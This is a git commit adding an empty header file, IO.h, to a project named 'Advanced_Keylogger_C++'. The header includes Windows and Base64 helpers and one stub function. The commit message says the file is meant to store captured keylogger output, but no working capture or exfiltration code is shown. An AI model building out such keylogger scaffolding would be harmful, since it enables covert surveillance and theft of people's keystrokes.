b1893c7e44b8d5b3e23acfc8bce43ecacd72f006
CChalland <ctchalland@gmail.com>
2018-06-20 19:39:53 -0500

    Added IO header file to retrive keylogger data in it's output files

---
+++ Advanced_Keylogger_C++/Advanced_Keylogger/IO.h
@@ -0,0 +1,21 @@
+#pragma once
+#ifndef IO_H
+#define IO_H
+
+#include <string>
+#include <cstdlib>
+#include <fstream>
+#include "windows.h"
+#include "Helper.h"
+#include "Base64.h"
+
+namespace IO
+{
+	std::string GetOurPath(const bool append_seperator = false)
+	{
+
+	}
+}
+
+
+#endif
